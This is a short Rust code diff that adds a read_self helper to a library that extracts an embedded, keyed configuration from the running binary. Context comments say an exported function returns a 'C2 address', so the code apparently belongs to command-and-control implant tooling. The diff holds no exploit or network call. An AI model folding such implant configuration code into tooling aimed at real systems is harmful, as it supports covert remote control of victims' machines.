@@ -111,6 +111,13 @@ where
     Ok(transformer::core::deserialize_payload(decoded)?)
 }
 
+/// ease-of-use function designed to call read() with a SelfExtractor
+/// and the passed in key.
+pub fn read_self(key: &[u8]) -> Result<models::core::Configuration, Box<dyn std::error::Error>> {
+    let reader: extractor::core::SelfExtractor = extractor::core::SelfExtractor {};
+    read(reader, key)
+}
+
 #[no_mangle]
 /// function designed to read the configuration bytes and
 /// return the C2 address. this will read the data from the
